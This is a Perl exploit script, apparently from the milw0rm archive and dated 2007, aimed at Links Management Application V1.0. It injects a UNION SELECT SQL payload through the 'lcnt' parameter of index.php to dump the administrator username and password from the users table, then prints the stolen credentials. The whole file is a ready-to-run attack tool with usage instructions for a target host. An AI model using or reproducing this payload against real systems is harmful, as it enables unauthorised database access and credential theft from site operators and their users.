#!/usr/bin/perl
#[Script Name: Links Management Application V1.0 (lcnt) Remote BLIND SQL Injection Exploit
#[Coded by   : ajann
#[Author     : ajann
#[Contact    : :(
#[S.Page     : http://www.monitor-line.com
#[$$         : $34.99
#[..         : ajann,Turkey

use IO::Socket;
if(@ARGV < 1){
print "
[========================================================================
[//   	Links Management Application V1.0 (lcnt) Remote BLIND SQL Injection Exploit
[//                   Usage: exploit.pl [target]
[//                   Example: exploit.pl victim.com
[//                   Example: exploit.pl victim.com
[//                           Vuln&Exp : ajann
[========================================================================
";
exit();
}
#Local variables
$server = $ARGV[0];
$server =~ s/(http:\/\/)//eg;
$host = "http://".$server;
$port = "80";
$file = "/index.php?a=listing&lcnt=";

print "Script <DIR> : ";
$dir = <STDIN>;
chop ($dir);

if ($dir =~ /exit/){
print "-- Exploit Failed[You Are Exited] \n";
exit();
}

if ($dir =~ /\//){}
else {
print "-- Exploit Failed[No DIR] \n";
exit();
 }


$target = "-1%20union%20select%200,0,1,2,3,4,5,6,0,concat(char(117,115,101,114,110,97,109,101,58),uname,char(32,112,97,115,115,58),pass,char(101,110,100,112,97,115,115)),222,11,1111,22,0,22,433,43,123,12%20from%20users/*";
$target = $host.$dir.$file.$target;

#Writing data to socket
print "+**********************************************************************+\n";
print "+ Trying to connect: $server\n";
$socket = IO::Socket::INET->new(Proto => "tcp", PeerAddr => "$server", PeerPort => "$port") || die "\n+ Connection failed...\n";
print $socket "GET $target HTTP/1.1\n";
print $socket "Host: $server\n";
print $socket "Accept: */*\n";
print $socket "Connection: close\n\n";
print "+ Connected!...\n";
#Getting
while($answer = <$socket>) {
if ($answer =~ /username:(.*?) pass/){
print "+ Exploit succeed! Getting admin information.\n";
print "+ ---------------- +\n";
print "+ Username: $1\n";
}

if ($answer =~ / pass:(.*?)endpass/){
print "+ Password: $1\n";
}

if ($answer =~ /Syntax error/) { 
print "+ Exploit Failed : ( \n";
print "+**********************************************************************+\n";
exit(); 
}

if ($answer =~ /Internal Server Error/) {
print "+ Exploit Failed : (  \n";
print "+**********************************************************************+\n";
exit(); 
}
 }

# milw0rm.com [2007-03-05]
